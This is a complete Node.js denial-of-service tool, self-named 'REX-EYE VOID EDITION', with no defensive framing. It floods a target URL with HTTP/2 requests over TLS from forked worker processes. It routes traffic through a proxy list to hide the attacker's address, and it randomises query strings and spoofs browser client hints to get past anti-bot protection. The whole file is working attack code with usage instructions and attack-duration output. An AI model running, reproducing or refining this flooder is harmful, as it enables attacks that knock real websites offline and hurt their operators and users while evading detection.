const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`
    REX-EYE VOID EDITION
    Usage: node raw.js <url> <time> <rate> <threads> [--noproxy]
    Example: node raw.js https://target.com 120 64 8
    `); 
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";

// Modern Cipher Suites - Support TLS 1.2 & 1.3
const ciphers = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305"
].join(":");

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`[VOID] ${proxies.length} Global Proxies Loaded.`);
    } catch(e) {
        console.log(`[FATAL] proxy.txt NOT FOUND. Cannot bypass Geo-IP without proxies.`);
        process.exit();
    }
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5]
};

const parsedTarget = url.parse(args.target);
let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`🔥 REX-EYE STARTING... BYPASSING GEO-LOCATION`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setTimeout(() => {
        console.log(`\n[!] ATTACK DURATION REACHED. TERMINATING.`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // High-speed interval
    setInterval(() => {
        if (stats.active < 1000) runFlooder();
    }, 1);
}

function randomString(l) {
    return crypto.randomBytes(l).toString('hex').slice(0, l);
}

function runFlooder() {
    stats.active++;
    
    // ANTI-IP LEAK: Block request if proxy is needed but empty
    if (useProxy && proxies.length === 0) {
        stats.active--;
        return;
    }

    const proxyAddr = useProxy ? proxies[Math.floor(Math.random() * proxies.length)] : null;
    
    const makeRequest = (connection) => {
        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2"], // Force HTTP/2
            servername: parsedTarget.host,
            secureContext: secureContext,
            rejectUnauthorized: false,
            decodeEmails: false
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { enablePush: false, initialWindowSize: 6291456 }
            });

            const streamInterval = setInterval(() => {
                const headers = {
                    // H1-H3 Pseudo-Headers
                    [":method"]: "GET",
                    [":path"]: parsedTarget.path + "?" + randomString(8) + "=" + randomString(5),
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    
                    // Client Hints (Anti-Bot Bypass)
                    "user-agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                    "accept-encoding": "gzip, deflate, br, zstd",
                    "accept-language": "en-US,en;q=0.9", // Fix Geo-detection
                    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": '"Windows"',
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "referer": "https://www.google.com/",
                    "cache-control": "no-cache"
                };

                const req = client.request(headers);
                
                // Set H2 Priority
                req.setPriority({ weight: 256, exclusive: true });

                req.on("response", (res) => {
                    stats.total++;
                    const status = res[":status"];
                    if (status === 200) stats.success++;
                    else if (status === 403 || status === 503) stats.blocked++;
                    req.close();
                    req.destroy();
                });

                req.on("error", () => {
                    stats.error++;
                    req.destroy();
                });

                req.end();
            }, 1000 / args.rate);

            // Auto-clean connection
            setTimeout(() => {
                clearInterval(streamInterval);
                client.destroy();
                tlsConn.destroy();
                stats.active--;
            }, 5000); 
        });

        tlsConn.on("error", () => {
            tlsConn.destroy();
            stats.active--;
        });
    };

    if (useProxy) {
        const [host, port] = proxyAddr.split(":");
        const proxySocket = net.connect(~~port, host);
        
        proxySocket.setKeepAlive(true, 60000);
        proxySocket.setTimeout(5000);

        proxySocket.once("connect", () => {
            proxySocket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        proxySocket.on("data", (chunk) => {
            if (chunk.toString().includes("200 Connection established")) {
                makeRequest(proxySocket);
            } else {
                proxySocket.destroy();
            }
        });

        proxySocket.on("error", () => {
            proxySocket.destroy();
            stats.active--;
        });
    } else {
        makeRequest(null);
    }
}

// Global Error Handlers
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});